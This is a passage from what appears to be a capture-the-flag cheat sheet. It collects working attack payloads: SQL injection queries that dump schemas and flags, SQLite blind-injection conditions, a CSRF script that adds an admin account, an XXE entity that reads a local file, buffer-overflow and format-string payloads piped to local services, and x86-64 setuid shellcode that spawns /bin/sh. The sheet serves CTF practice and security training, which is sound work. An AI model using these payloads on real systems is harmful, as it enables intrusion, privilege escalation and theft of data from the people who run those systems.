1 UNION ALL SELECT 1,table_schema,3,4  FROM information_schema.tables--
1 UNION ALL SELECT 1,column_name,table_name,4  FROM information_schema.columns--
1 UNION ALL SELECT 1,flag,3,4 FROM found_me--

=> SQLITE3

case when (1=1) then 0 else randomblob(100000000000000) end
case when substr((select flag from ctf),1,1)='f' then 0 else randomblob(100000000000000) end
```

#### CSRF
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CSRF%20Injection/README.md

```bash
====(1)====
-> Hosted (using ngrok/vps) : https://10.10.10.10/csrf.html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost/addadmin.php");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("username=admin3&password=admin3");
</script>
```


#### XXE

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md

```bash
====(1)====
<!DOCTYPE root [<!ENTITY example SYSTEM 'file:///flag.txt'>]>
<score>&example;</score>

====(2)====

```

# Binary Exploitation

### Payload

```bash
for i in {1..50};do python3 -c "print('a' * $i)" | ./auth;done
for i in {1..50};do python -c "print('a' * $i)" | ./auth;done
for i in {1..50};do echo "Length Payload : " $i;echo;python3 -c "print('a' * $i)" | ./overflow3 ;done
for i in {1..10};do python3 -c "print('\nadmin'+('\x00' * $i)+'admin')" | ./auth2;done
for i in {1..10};do python2 -c "print('\nadmin'+('\x00' * $i)+'admin')" | ./auth2;done
echo -e "\naaaaaaaaaaaaaaa" > input.txt
python -c "print 'A' * 140+'\xef\xbe\xad\xde'+'AAAAAAAA'+'\x29\x52\x55\x55\x55\x55'" | nc 127.0.0.1 1337
python -c "print '/bin/cat\${IFS}*\n'+'A'*20+'\xe0\x83\x04\x08'+'CCCC'+'\x34\xa0\x04\x08'" | nc 127.0.0.1 1337
python -c "print('11111111111'+'A'*285+'\xd6\x11\x40\x00\x00\x00\ncat *')" | nc 127.0.0.1 9001

# Create Pattern and Check Offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 128
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762
```

### Zeratool

```bash
# Commands

# References
https://github.com/ChrisTheCoolHut/Zeratool
```

### Format String

```bash
# Payload
python3 -c "print('A' * 4 + '-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x')" | ./format
python3 -c "print('AAAABBBB' + '-%x-%x-%x-%x-%x-%5$s-')" | ./format
echo 'AAAA-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-' | ./format
echo '%16$p' | ./format 

#Format String vulnerabilities.
- Leaking secrets
- Denial of Service
- Leaking memory addresses
- Overwriting memory addresses 

# References
- https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be
- https://www.netsparker.com/blog/web-security/format-string-vulnerabilities/#:~:text=why%20they%20exist.-,Format%20strings%20are%20used%20in%20many%20programming%20languages%20to%20insert,information%20or%20execute%20arbitrary%20code
- https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability
- https://resources.infosecinstitute.com/topic/how-to-exploit-format-string-vulnerabilities/
- https://owasp.org/www-community/attacks/Format_string_attack
- https://ctf-wiki.mahaloz.re/pwn/linux/fmtstr/fmtstr_intro/
- https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b
```

### ShellCode

```bash
# (1) Linux x86_x64 (bin/sh + setuid(0) + setgid(0))
# gcc -nostdlib -static shellcode.s -o shellcode.elf
# objcopy --dump-section .text=shellcode.raw shellcode.elf
# (cat shellcode.raw;cat) | ./pwn
# "\x48\x31\xff\x48\xc7\xc0\x69\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x6a\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3b\x00\x00\x00\x48\x8d\x3d\x10\x00\x00\x00\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\x00\x00\x00\x00\x0f\x05\x2f\x62\x69\x6e\x2f\x73\x68\x00"

.global _start
start:
.intel_syntax noprefix
	xor rdi,rdi		# setuid (0)
	mov rax, 0x69
	syscall
	xor rdi,rdi  		# setgid (0)
	mov rax, 0x6a
	syscall
	mov rax, 59		# this is the syscall number of execve
	lea rdi, [rip+binsh]	# points the first argument of execve at the first  /bin/sh string below
	mov rsi,0		# this makes the second argument, argv, NULL
	mov rdx,0		# this makes the third argument, envp, NULL
	syscall			# this riggers the system call
binsh:				# a label marking where /bin/sh string is
	.string "/bin/sh"
	
# (2)
```

### Convert Binary to ShellCode

```bash
# Commands
hexdump -v -e '"\\""x" 1/1 "%02x" ""' shellcode.raw
``` 

### One_gadget

```bash
# Install
gem install one_gadget --source http://rubygems.org

# Usage
one_gadget -f libc.so.6 
```

### Check ASLR

```bash
# Commands
cat /proc/sys/kernel/randomize_va_space

# Information
(0 = disabled)
(1 = enabled)
```

# OSINT

### OSINT Online Tools

```bash
=> Search by Image
$ https://pimeyes.com/en
```

# References
- http://www.wechall.net/challs
- https://ctftime.org/
- https://fareedfauzi.github.io/notes/Ctf-Checklist/#
- https://github.com/RakhithJK/Cyber-Security_Collection
- https://github.com/sajjadium/ctf-archives